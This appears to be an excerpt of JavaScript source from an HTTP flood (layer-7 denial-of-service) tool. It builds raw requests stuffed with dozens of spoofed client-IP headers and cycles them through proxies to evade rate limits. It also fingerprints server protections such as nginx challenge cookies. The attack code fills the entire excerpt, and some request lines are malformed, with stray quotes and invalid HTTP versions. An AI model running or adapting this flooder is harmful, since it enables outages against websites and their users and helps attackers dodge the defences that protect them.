        ...
        proxy(a) {
            let stop = Date.now() + 120e3,
                req = () => {
                    ...
                    (netSock.writable && !netSock.destroyed) ? netSock.write(`${l7.opt.method} ${flooder.realize} HTTP/1.1\r\nHost: ${l7.parsed.host}\r\nx-HTML-Edge-Cache: no-cache\r\nReferer: ""\r\nUpgrade-Insecure-Requests: 1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate, br${a.cookie ? ('\r\nCookie: ' + a.cookie) : ''}\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: no-cache\r\nPrama: no-cache\r\nUser-Agent: ${a.userAgent}\r\n\r\n${a.body || l7.opt.body || ""}`): netSock.end();
                    (netSock.writable && !netSock.destroyed) ? netSock.write(`'GET ' ${a.target || l7.target} HTTP/1.3\r\nHost: ${l7.parsed.host}\r\nConnection: Keep-Alive\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate, br${a.cookie ? ('\r\nCookie: ' + a.cookie) : ''}\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nUser-Agent: ${a.userAgent}\r\n\r\n${a.body || l7.opt.body || ""}`): netSock.end();
                    (netSock.writable && !netSock.destroyed) ? netSock.write(`${l7.opt.method} ${a.target || l7.target} HTTP/2\r\nHost: ${l7.parsed.host}\r\nConnection: Keep-Alive\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate, br${a.cookie ? ('\r\nCookie: ' + a.cookie) : ''}\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nUser-Agent: ${a.userAgent}\r\n\r\n${a.body || l7.opt.body || ""}`): netSock.end();
                    (netSock.writable && !netSock.destroyed) ? netSock.write(`'POST ' ${a.target || l7.target} HTTP/1.2\r\nHost: ${l7.parsed.host}\r\nConnection: Keep-Alive\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate, br${a.cookie ? ('\r\nCookie: ' + a.cookie) : ''}\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nUser-Agent: ${a.userAgent}\r\n\r\n${a.body || l7.opt.body || ""}`): netSock.end();
					(netSock.writable && !netSock.destroyed) ? netSock.write(`${l7.opt.method} ${flooder.realize}=${flooder.realize} HTTP/1\r\nHost: ${l7.parsed.host}\r\nx-HTML-Edge-Cache: no-cache\r\nReferer: ""\r\nTrue-Client-IP: localhost\r\nOrigin: https://${l7.parsed.host}\r\nConnection: Keep-alive\r\nKeep-alive: 700\r\nX-Real-IP: ${l7.parsed.host}\r\nX-Forwarded-For: ${l7.parsed.host}\r\nX-Original-Forwarded-For: ${l7.parsed.host}\r\nX-Originating-IP: ${l7.parsed.host}\r\nX-Remote-IP: ${l7.parsed.host}\r\nX-Remote-Addr: ${l7.parsed.host}\r\nX-Client-IP: ${l7.parsed.host}\r\nX-Host: ${l7.parsed.host}\r\nX-Forwared-Host: ${l7.parsed.host}\r\nTrue-Client-IP: ${l7.parsed.host}\r\nX-Forwarded: ${l7.parsed.host}\r\nForwarded-For: ${l7.parsed.host}\r\nForwarded: ${l7.parsed.host}\r\nX-Forwarded-Host: ${l7.parsed.host}\r\nX-remote-IP: ${l7.parsed.host}\r\nX-remote-addr: ${l7.parsed.host}\r\nClient-IP: ${l7.parsed.host}\r\nAli-CDN-Real-IP: ${l7.parsed.host}\r\nCdn-Src-Ip: ${l7.parsed.host}\r\nCdn-Real-Ip: ${l7.parsed.host}\r\nCF-Connecting-IP: ${l7.parsed.host}\r\nX-Cluster-Client-IP: ${l7.parsed.host}\r\nWL-Proxy-Client-IP: ${l7.parsed.host}\r\nProxy-Client-IP: ${l7.parsed.host}\r\nFastly-Client-Ip: ${l7.parsed.host}\r\nTrue-Client-Ip: ${l7.parsed.host}\r\nX-Custom-IP-Authorization: ${l7.parsed.host}\r\nX-Real-IP: localhost\r\nX-Forwarded-For: localhost\r\nX-Original-Forwarded-For: localhost\r\nX-Originating-IP: localhost\r\nX-Remote-IP: localhost\r\nX-Remote-Addr: localhost\r\nX-Client-IP: localhost\r\nX-Host: localhost\r\nX-Forwared-Host: localhost\r\nTrue-Client-IP: localhost\r\nX-Forwarded: localhost\r\nForwarded-For: localhost\r\nForwarded: localhost\r\nX-Forwarded-Host: localhost\r\nX-remote-IP: localhost\r\nX-remote-addr: localhost\r\nClient-IP: localhost\r\nAli-CDN-Real-IP: localhost\r\nCdn-Src-Ip: localhost\r\nCdn-Real-Ip: localhost\r\nCF-Connecting-IP: localhost\r\nX-Cluster-Client-IP: localhost\r\nWL-Proxy-Client-IP: localhost\r\nProxy-Client-IP: localhost\r\nFastly-Client-Ip: localhost\r\nTrue-Client-Ip: localhost\r\nX-Custom-IP-Authorization: localhost\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate, br${a.cookie ? ('\r\nCookie: ' + a.cookie) : ''}\r\nX-Forwarded-For: ${flooder.randomSpoof}\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: no-cache\r\nPrama: no-cache\r\nUser-Agent: ${a.userAgent}\r\n\r\n${a.body || l7.opt.body || ""}`): netSock.end();
                    (netSock.writable && !netSock.destroyed) ? netSock.write(`${l7.opt.method} ${flooder.realize}=${flooder.realize} HTTP/1.3\r\nHost: ${l7.parsed.host}\r\nx-HTML-Edge-Cache: no-cache\r\nReferer: ""\r\nTrue-Client-IP: localhost\r\nOrigin: https://${l7.parsed.host}\r\nConnection: Keep-alive\r\nKeep-alive: 90\r\nX-Real-IP: ${l7.parsed.host}\r\nX-Forwarded-For: ${l7.parsed.host}\r\nX-Original-Forwarded-For: ${l7.parsed.host}\r\nX-Originating-IP: ${l7.parsed.host}\r\nX-Remote-IP: ${l7.parsed.host}\r\nX-Remote-Addr: ${l7.parsed.host}\r\nX-Client-IP: ${l7.parsed.host}\r\nX-Host: ${l7.parsed.host}\r\nX-Forwared-Host: ${l7.parsed.host}\r\nTrue-Client-IP: ${l7.parsed.host}\r\nX-Forwarded: ${l7.parsed.host}\r\nForwarded-For: ${l7.parsed.host}\r\nForwarded: ${l7.parsed.host}\r\nX-Forwarded-Host: ${l7.parsed.host}\r\nX-remote-IP: ${l7.parsed.host}\r\nX-remote-addr: ${l7.parsed.host}\r\nClient-IP: ${l7.parsed.host}\r\nAli-CDN-Real-IP: ${l7.parsed.host}\r\nCdn-Src-Ip: ${l7.parsed.host}\r\nCdn-Real-Ip: ${l7.parsed.host}\r\nCF-Connecting-IP: ${l7.parsed.host}\r\nX-Cluster-Client-IP: ${l7.parsed.host}\r\nWL-Proxy-Client-IP: ${l7.parsed.host}\r\nProxy-Client-IP: ${l7.parsed.host}\r\nFastly-Client-Ip: ${l7.parsed.host}\r\nTrue-Client-Ip: ${l7.parsed.host}\r\nX-Custom-IP-Authorization: ${l7.parsed.host}\r\nX-Real-IP: localhost\r\nX-Forwarded-For: localhost\r\nX-Original-Forwarded-For: localhost\r\nX-Originating-IP: localhost\r\nX-Remote-IP: localhost\r\nX-Remote-Addr: localhost\r\nX-Client-IP: localhost\r\nX-Host: localhost\r\nX-Forwared-Host: localhost\r\nTrue-Client-IP: localhost\r\nX-Forwarded: localhost\r\nForwarded-For: localhost\r\nForwarded: localhost\r\nX-Forwarded-Host: localhost\r\nX-remote-IP: localhost\r\nX-remote-addr: localhost\r\nClient-IP: localhost\r\nAli-CDN-Real-IP: localhost\r\nCdn-Src-Ip: localhost\r\nCdn-Real-Ip: localhost\r\nCF-Connecting-IP: localhost\r\nX-Cluster-Client-IP: localhost\r\nWL-Proxy-Client-IP: localhost\r\nProxy-Client-IP: localhost\r\nFastly-Client-Ip: localhost\r\nTrue-Client-Ip: localhost\r\nX-Custom-IP-Authorization: localhost\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate, br${a.cookie ? ('\r\nCookie: ' + a.cookie) : ''}\r\nX-Forwarded-For: ${flooder.randomSpoof}\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: no-cache\r\nPrama: no-cache\r\nUser-Agent: ${a.userAgent}\r\n\r\n${a.body || l7.opt.body || ""}`): netSock.end();
                    (netSock.writable && !netSock.destroyed) ? netSock.write(`${l7.opt.method} ${flooder.realize} HTTP/2\r\nHost: ${l7.parsed.host}\r\nx-HTML-Edge-Cache: no-cache\r\nReferer: ""\r\nTrue-Client-IP: localhost\r\nOrigin: https://${l7.parsed.host}\r\nConnection: Keep-alive\r\nKeep-Alive: 80\r\nX-Real-IP: ${l7.parsed.host}\r\nX-Forwarded-For: ${l7.parsed.host}\r\nX-Original-Forwarded-For: ${l7.parsed.host}\r\nX-Originating-IP: ${l7.parsed.host}\r\nX-Remote-IP: ${l7.parsed.host}\r\nX-Remote-Addr: ${l7.parsed.host}\r\nX-Client-IP: ${l7.parsed.host}\r\nX-Host: ${l7.parsed.host}\r\nX-Forwared-Host: ${l7.parsed.host}\r\nTrue-Client-IP: ${l7.parsed.host}\r\nX-Forwarded: ${l7.parsed.host}\r\nForwarded-For: ${l7.parsed.host}\r\nForwarded: ${l7.parsed.host}\r\nX-Forwarded-Host: ${l7.parsed.host}\r\nX-remote-IP: ${l7.parsed.host}\r\nX-remote-addr: ${l7.parsed.host}\r\nClient-IP: ${l7.parsed.host}\r\nAli-CDN-Real-IP: ${l7.parsed.host}\r\nCdn-Src-Ip: ${l7.parsed.host}\r\nCdn-Real-Ip: ${l7.parsed.host}\r\nCF-Connecting-IP: ${l7.parsed.host}\r\nX-Cluster-Client-IP: ${l7.parsed.host}\r\nWL-Proxy-Client-IP: ${l7.parsed.host}\r\nProxy-Client-IP: ${l7.parsed.host}\r\nFastly-Client-Ip: ${l7.parsed.host}\r\nTrue-Client-Ip: ${l7.parsed.host}\r\nX-Custom-IP-Authorization: ${l7.parsed.host}\r\nX-Real-IP: localhost\r\nX-Forwarded-For: localhost\r\nX-Original-Forwarded-For: localhost\r\nX-Originating-IP: localhost\r\nX-Remote-IP: localhost\r\nX-Remote-Addr: localhost\r\nX-Client-IP: localhost\r\nX-Host: localhost\r\nX-Forwared-Host: localhost\r\nTrue-Client-IP: localhost\r\nX-Forwarded: localhost\r\nForwarded-For: localhost\r\nForwarded: localhost\r\nX-Forwarded-Host: localhost\r\nX-remote-IP: localhost\r\nX-remote-addr: localhost\r\nClient-IP: localhost\r\nAli-CDN-Real-IP: localhost\r\nCdn-Src-Ip: localhost\r\nCdn-Real-Ip: localhost\r\nCF-Connecting-IP: localhost\r\nX-Cluster-Client-IP: localhost\r\nWL-Proxy-Client-IP: localhost\r\nProxy-Client-IP: localhost\r\nFastly-Client-Ip: localhost\r\nTrue-Client-Ip: localhost\r\nX-Custom-IP-Authorization: localhost\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate, br${a.cookie ? ('\r\nCookie: ' + a.cookie) : ''}\r\nX-Forwarded-For: ${flooder.randomSpoof}\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: no-cache\r\nPrama: no-cache\r\nUser-Agent: ${a.userAgent}\r\n\r\n${a.body || l7.opt.body || ""}`): netSock.end();
                    (netSock.writable && !netSock.destroyed) ? netSock.write(`${l7.opt.method} ${flooder.realize}=${flooder.realize} HTTP/1.2\r\nHost: ${l7.parsed.host}\r\nx-HTML-Edge-Cache: no-cache\r\nReferer: ""\r\nTrue-Client-IP: localhost\r\nOrigin: https://${l7.parsed.host}\r\nConnection: Keep-alive\r\nKeep-alive: 60\r\nKeep-Alive: 80\r\nX-Real-IP: ${l7.parsed.host}\r\nX-Forwarded-For: ${l7.parsed.host}\r\nX-Original-Forwarded-For: ${l7.parsed.host}\r\nX-Originating-IP: ${l7.parsed.host}\r\nX-Remote-IP: ${l7.parsed.host}\r\nX-Remote-Addr: ${l7.parsed.host}\r\nX-Client-IP: ${l7.parsed.host}\r\nX-Host: ${l7.parsed.host}\r\nX-Forwared-Host: ${l7.parsed.host}\r\nTrue-Client-IP: ${l7.parsed.host}\r\nX-Forwarded: ${l7.parsed.host}\r\nForwarded-For: ${l7.parsed.host}\r\nForwarded: ${l7.parsed.host}\r\nX-Forwarded-Host: ${l7.parsed.host}\r\nX-remote-IP: ${l7.parsed.host}\r\nX-remote-addr: ${l7.parsed.host}\r\nClient-IP: ${l7.parsed.host}\r\nAli-CDN-Real-IP: ${l7.parsed.host}\r\nCdn-Src-Ip: ${l7.parsed.host}\r\nCdn-Real-Ip: ${l7.parsed.host}\r\nCF-Connecting-IP: ${l7.parsed.host}\r\nX-Cluster-Client-IP: ${l7.parsed.host}\r\nWL-Proxy-Client-IP: ${l7.parsed.host}\r\nProxy-Client-IP: ${l7.parsed.host}\r\nFastly-Client-Ip: ${l7.parsed.host}\r\nTrue-Client-Ip: ${l7.parsed.host}\r\nX-Custom-IP-Authorization: ${l7.parsed.host}\r\nX-Real-IP: localhost\r\nX-Forwarded-For: localhost\r\nX-Original-Forwarded-For: localhost\r\nX-Originating-IP: localhost\r\nX-Remote-IP: localhost\r\nX-Remote-Addr: localhost\r\nX-Client-IP: localhost\r\nX-Host: localhost\r\nX-Forwared-Host: localhost\r\nTrue-Client-IP: localhost\r\nX-Forwarded: localhost\r\nForwarded-For: localhost\r\nForwarded: localhost\r\nX-Forwarded-Host: localhost\r\nX-remote-IP: localhost\r\nX-remote-addr: localhost\r\nClient-IP: localhost\r\nAli-CDN-Real-IP: localhost\r\nCdn-Src-Ip: localhost\r\nCdn-Real-Ip: localhost\r\nCF-Connecting-IP: localhost\r\nX-Cluster-Client-IP: localhost\r\nWL-Proxy-Client-IP: localhost\r\nProxy-Client-IP: localhost\r\nFastly-Client-Ip: localhost\r\nTrue-Client-Ip: localhost\r\nX-Custom-IP-Authorization: localhost\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate, br${a.cookie ? ('\r\nCookie: ' + a.cookie) : ''}\r\nX-Forwarded-For: ${flooder.randomSpoof}\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: no-cache\r\nPrama: no-cache\r\nUser-Agent: ${a.userAgent}\r\n\r\n${a.body || l7.opt.body || ""}`): netSock.end();
                    (netSock.writable && !netSock.destroyed) ? netSock.write(`$'GET ' ${flooder.realize}=${flooder.realize} HTTP/1.1\r\nHost: ${l7.parsed.host}\r\nx-HTML-Edge-Cache: no-cache\r\nReferer: ""\r\nTrue-Client-IP: localhost\r\nOrigin: https://${l7.parsed.host}\r\nConnection: Keep-alive\r\nKeep-alive: 60\r\nKeep-Alive: 80\r\nX-Real-IP: ${l7.parsed.host}\r\nX-Forwarded-For: ${l7.parsed.host}\r\nX-Original-Forwarded-For: ${l7.parsed.host}\r\nX-Originating-IP: ${l7.parsed.host}\r\nX-Remote-IP: ${l7.parsed.host}\r\nX-Remote-Addr: ${l7.parsed.host}\r\nX-Client-IP: ${l7.parsed.host}\r\nX-Host: ${l7.parsed.host}\r\nX-Forwared-Host: ${l7.parsed.host}\r\nTrue-Client-IP: ${l7.parsed.host}\r\nX-Forwarded: ${l7.parsed.host}\r\nForwarded-For: ${l7.parsed.host}\r\nForwarded: ${l7.parsed.host}\r\nX-Forwarded-Host: ${l7.parsed.host}\r\nX-remote-IP: ${l7.parsed.host}\r\nX-remote-addr: ${l7.parsed.host}\r\nClient-IP: ${l7.parsed.host}\r\nAli-CDN-Real-IP: ${l7.parsed.host}\r\nCdn-Src-Ip: ${l7.parsed.host}\r\nCdn-Real-Ip: ${l7.parsed.host}\r\nCF-Connecting-IP: ${l7.parsed.host}\r\nX-Cluster-Client-IP: ${l7.parsed.host}\r\nWL-Proxy-Client-IP: ${l7.parsed.host}\r\nProxy-Client-IP: ${l7.parsed.host}\r\nFastly-Client-Ip: ${l7.parsed.host}\r\nTrue-Client-Ip: ${l7.parsed.host}\r\nX-Custom-IP-Authorization: ${l7.parsed.host}\r\nX-Real-IP: localhost\r\nX-Forwarded-For: localhost\r\nX-Original-Forwarded-For: localhost\r\nX-Originating-IP: localhost\r\nX-Remote-IP: localhost\r\nX-Remote-Addr: localhost\r\nX-Client-IP: localhost\r\nX-Host: localhost\r\nX-Forwared-Host: localhost\r\nTrue-Client-IP: localhost\r\nX-Forwarded: localhost\r\nForwarded-For: localhost\r\nForwarded: localhost\r\nX-Forwarded-Host: localhost\r\nX-remote-IP: localhost\r\nX-remote-addr: localhost\r\nClient-IP: localhost\r\nAli-CDN-Real-IP: localhost\r\nCdn-Src-Ip: localhost\r\nCdn-Real-Ip: localhost\r\nCF-Connecting-IP: localhost\r\nX-Cluster-Client-IP: localhost\r\nWL-Proxy-Client-IP: localhost\r\nProxy-Client-IP: localhost\r\nFastly-Client-Ip: localhost\r\nTrue-Client-Ip: localhost\r\nX-Custom-IP-Authorization: localhost\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate, br${a.cookie ? ('\r\nCookie: ' + a.cookie) : ''}\r\nX-Forwarded-For: ${flooder.randomSpoof}\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: no-cache\r\nPrama: no-cache\r\nUser-Agent: ${a.userAgent}\r\n\r\n${a.body || l7.opt.body || ""}`): netSock.end();
                    (netSock.writable && !netSock.destroyed) ? netSock.write(`$'HEAD ' ${flooder.realize}=${flooder.realize} HTTP/2\r\nHost: ${l7.parsed.host}\r\nx-HTML-Edge-Cache: no-cache\r\nReferer: ""\r\nTrue-Client-IP: localhost\r\nOrigin: https://${l7.parsed.host}\r\nConnection: Keep-alive\r\nKeep-alive: 60\r\nKeep-Alive: 80\r\nX-Real-IP: ${l7.parsed.host}\r\nX-Forwarded-For: ${l7.parsed.host}\r\nX-Original-Forwarded-For: ${l7.parsed.host}\r\nX-Originating-IP: ${l7.parsed.host}\r\nX-Remote-IP: ${l7.parsed.host}\r\nX-Remote-Addr: ${l7.parsed.host}\r\nX-Client-IP: ${l7.parsed.host}\r\nX-Host: ${l7.parsed.host}\r\nX-Forwared-Host: ${l7.parsed.host}\r\nTrue-Client-IP: ${l7.parsed.host}\r\nX-Forwarded: ${l7.parsed.host}\r\nForwarded-For: ${l7.parsed.host}\r\nForwarded: ${l7.parsed.host}\r\nX-Forwarded-Host: ${l7.parsed.host}\r\nX-remote-IP: ${l7.parsed.host}\r\nX-remote-addr: ${l7.parsed.host}\r\nClient-IP: ${l7.parsed.host}\r\nAli-CDN-Real-IP: ${l7.parsed.host}\r\nCdn-Src-Ip: ${l7.parsed.host}\r\nCdn-Real-Ip: ${l7.parsed.host}\r\nCF-Connecting-IP: ${l7.parsed.host}\r\nX-Cluster-Client-IP: ${l7.parsed.host}\r\nWL-Proxy-Client-IP: ${l7.parsed.host}\r\nProxy-Client-IP: ${l7.parsed.host}\r\nFastly-Client-Ip: ${l7.parsed.host}\r\nTrue-Client-Ip: ${l7.parsed.host}\r\nX-Custom-IP-Authorization: ${l7.parsed.host}\r\nX-Real-IP: localhost\r\nX-Forwarded-For: localhost\r\nX-Original-Forwarded-For: localhost\r\nX-Originating-IP: localhost\r\nX-Remote-IP: localhost\r\nX-Remote-Addr: localhost\r\nX-Client-IP: localhost\r\nX-Host: localhost\r\nX-Forwared-Host: localhost\r\nTrue-Client-IP: localhost\r\nX-Forwarded: localhost\r\nForwarded-For: localhost\r\nForwarded: localhost\r\nX-Forwarded-Host: localhost\r\nX-remote-IP: localhost\r\nX-remote-addr: localhost\r\nClient-IP: localhost\r\nAli-CDN-Real-IP: localhost\r\nCdn-Src-Ip: localhost\r\nCdn-Real-Ip: localhost\r\nCF-Connecting-IP: localhost\r\nX-Cluster-Client-IP: localhost\r\nWL-Proxy-Client-IP: localhost\r\nProxy-Client-IP: localhost\r\nFastly-Client-Ip: localhost\r\nTrue-Client-Ip: localhost\r\nX-Custom-IP-Authorization: localhost\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate, br${a.cookie ? ('\r\nCookie: ' + a.cookie) : ''}\r\nX-Forwarded-For: ${flooder.randomSpoof}\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: no-cache\r\nPrama: no-cache\r\nUser-Agent: ${a.userAgent}\r\n\r\n${a.body || l7.opt.body || ""}`): netSock.end();
                }
            var resetted = false,
                netSock = {};
    ...
    class starter {
        init(threads) {
            ...
            if (l7.opt.ratelimit) {
                ...
                setInterval(sendreq, 80); // 30ms fight rate limits. Loop through each proxy, more proxies less traffic per ip.
            } else {
                function randomreq() {
        ...
        detect() {
            function detectplz() {
                ...
                request({
                    ...
                    maxRedirects: 170,
                    agentOptions: {
            //            ciphers: 'AEAD-CHACHA20-POLY1305-SHA256:RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM'
              //          ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA'
             //           ciphers: 'AES128-SHA'
                        ciphers: 'AES128-SHA:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:TLS_AES_128_CCM_8_SHA256:TLS_AES_128_CCM_SHA256:TLS_AES_256_GCM_SHA384:AEAD-AES256-GCM-SHA384:AEAD-AES128-GCM-SHA256:AEAD-CHACHA20-POLY1305-SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA'
                    },
                    timeout: 80e3,
                    proxy: dproxy,
                    headers: {
                    ...
                    } else if (res.headers.server && res.headers.server.startsWith('nginx') && res.statusCode == 503 && res.headers['set-cookie'] && res.headers['set-cookie'][0].startsWith('nooder_t=')) {
